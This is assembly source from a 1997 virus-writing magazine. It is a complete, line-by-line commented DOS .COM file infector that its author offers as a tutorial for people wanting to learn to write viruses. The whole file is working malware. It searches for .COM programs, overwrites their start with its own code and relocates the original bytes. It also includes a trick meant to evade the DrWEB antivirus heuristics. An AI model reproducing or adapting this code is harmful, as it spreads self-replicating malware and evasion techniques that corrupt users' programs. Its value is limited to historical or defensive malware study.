
;      ‹‹                  €
;     ﬂﬂﬂ  Virus Magazine  € Box 176, Kiev 210, Ukraine      IV  1997
;     ﬂ€€ ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ € ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ ﬂ ﬂﬂﬂﬂﬁﬂﬂﬂ  €ﬂﬂﬂﬂﬂﬂ€
;      ﬁ€ €ﬂ‹ €ﬂﬂ ‹ﬂﬂ ‹ﬂﬂ ‹€‹ ‹ﬂﬂ €ﬂ€    › € ‹ﬂ€ € ‹ﬂﬂ €‹‹   € ﬂﬂﬂ€ €
;       € € € €ﬂ  €ﬂ  €    €  €ﬂ  € €    € € € € € €   €     € ‹‹‹€ €
;       € ﬁ ﬁ ﬁ   ﬁ‹‹ ﬁ‹‹  ﬁ  ﬁ‹‹ ﬁ‹ﬂ     ﬂ€ ﬂ‹€ ﬁ ﬁ‹‹ ﬁ‹‹‹  € €‹‹‹ €
;       ﬁ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹  €‹‹‹‹‹‹€
;          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.
;                             sgww@hotmail.com
;            Digest of IV 8 - 11 russian, including Moscow issues


; Many people wanna learn how to write virii, but do not have
; knowlenge at all. This virus was written for those people.
; Everything is clear, and I hope this virus for beginners
; will help them.
;                                  (c) by Int O`Dream (1996)

; [Example 200]
; Com-NonResident from the current directory
; Was written only for Example (for Beginers)

.model tiny
.code
org 100h
start:
mov bp,ds:[len_of_infected_program]  ; Save length of infected program to
                                     ; bp (we use Len_of_infected_program
                                     ; to infect another programs.

mov cx,100                              ; Data Transfer Area length
mov si,80h                              ; From 80h
mov di,buf1                             ; Save DTA to buf1
cld
rep movsb

mov ah,4eh                              ; function "Find first file"

find:
db 068h                 ; Little joke for antivirus heuristics - now
dw offset @web1         ; DrWEB cannot detect us as ".COM virus"
ret                     ;
pop ax                  ;
@web1:                  ;

mov cx,20h              ; Search for files with ARCHIVE attribute
lea dx,fmask            ; File mask *.COM
int 21h                 ; Calling interrupt

jc quit                 ; If there's no more .com files (carry flag is set),
                        ; finishing our work

cmp word ptr ds:[9ah],len        ; Length of found program (offset 9ah)
jb next                          ; If this length is below virus length
cmp word ptr ds:[9ah],61000      ; or it is above 61000
ja next                          ; then searching for next file


mov ax,3d02h            ; Open found file for read/write access
mov dx,9eh              ; Search functions return program name to DTA
                        ; (DATA TRANSFER AREA) (when program loads, DTA is
                        ; located in the upper part of PSP - in command line
                        ; area - PSP:80h, so we must save this area, 'cause
                        ; if we don't, we're losing all command line
                        ; parameters. The name of found file (after search
                        ; function) begins at offset 9eh in PSP and ends
                        ; with zero symbol.

int 21h                 ; open found file
jc next                 ; if there was an error while opening, we jump to
                        ; next file search

xchg ax,bx              ; when file is opened, AX contains this file HANDLE
                        ; We're saving it to BX to continue our work
                        ; (read/write/seek/close functions works with
                        ; BX register (with file handle) - that's why
                        ; we moved file handle to BX)

mov ah,3fh              ; read from file function

mov cx,len              ; in CX register we put number of bytes to read
                        ; (len is virus length)
mov dx,buf              ; in DX - buffer for these bytes
int 21h                 ; calling interrupt

mov si,dx               ; si=buf, (we cannot use DX, because DX isn't
                        ; index register and cannot be used as offset here,
                        ; we use index register SI instead)

cmp word ptr [ds:si],2e8bh      ; Compare two first bytes of program: are
                                ; these bytes the same as two first virus
                                ; bytes?
jz next                         ; Yes ? It means that program is already
                                ; infected - jump to find next program

cmp byte ptr [ds:si],'Z'        ; Maybe found .COM file is EXE in deed?
jz next                         ; (it begins from ZM or MZ symbols)
cmp byte ptr [ds:si],'M'
jnz @1                          ; All ok? Jump to infect it!

next:
mov ah,3eh                      ; close file function
int 21h                         ; calling interrupt
mov ah,4fh                      ; find next file function
jmp find                        ; jump to find next

@1:
mov ax,4202h                    ; move pointer (ah = 42h)
                                ; from the end of file (al = 02h)
xor cx,cx                       ; CX:DX is length to move pointer
xor dx,dx                       ; (high part in CX)
                                ; here we got zero to CX and DX,
                                ; it means that we move pointer to the
                                ; end of the file

int 21h                         ; calling interrupt
jc next                         ; Errors ? jump to find next file

mov ds:[len_of_infected_program],ax  ; After pointer was moved, length
                                     ; of program is placed in AX

mov ah,40h      ; write to file function
mov cx,len      ; number of bytes to write
mov dx,buf      ; from buffer
int 21h         ; that means that we wrote beginning part of the program
                ; (size of this part is equal to our virus size)
                ; to the end
jc next         ; Errors ? Find next

mov ax,4200h  ; Move pointer again, now to the beginning of program (AL = 0h)
xor cx,cx     ;
xor dx,dx     ;
int 21h       ; calling interrupt
jc next       ; Errors again ? Find next

mov ah,40h    ; write to file function
mov dx,100h   ; from offset 100h
mov cx,len    ; number of bytes to write
int 21h       ; and now virii is written to the beginning of program
jc next       ; Errors ? you know ;)

quit:       ; Here is quit !

mov di,80h
mov si,buf1
mov cx,100h
push cx
rep movsb  ; Restore DTA

pop di ; di = begining of program = 100h
push di ; 100h begin of program  ; these 100h we pushed to the stack
mov si,bp       ; si = length of infected program we started from
add si,100h     ; add 100h - PSP length
mov bx,other    ; part of memory
push bx         ; push it to the stack too
mov word ptr ds:[bx],0a4f3h   ; rep movsb
mov byte ptr ds:[bx+2],0c3h   ; ret

       ; write these command to the part of memory "other"

xor ax,ax    ; zero these registers
xor bx,bx    ;
mov cx,len   ; number of bytes to move
ret          ; give control to commands "rep movsb / ret"

                ; "movsb" command sends 1 byte from ds:si to es:di
                ; prefix "rep" says, that this operation must be done
                ; CX times, "CLD" command says, that after "movsb"
                ; command SI=SI+1, DI=DI+1

              ; it means that we copy beginning of program we started
              ; from to the start and give control to it

              ; That's all ? All !

fmask db '*.com',0 ; file mask
mess db '3mun'
len_of_infected_program dw len ; Length of infected program
buf equ 0f000h                 ; Buffer for our work (placed very high)
other equ 0f000h+len+1         ; second buffer for commands
buf1 equ other+4
len equ $-start                ; Virus length
ret                            ; One byte to install first time
end start                      ; This is the end, my only friend, the end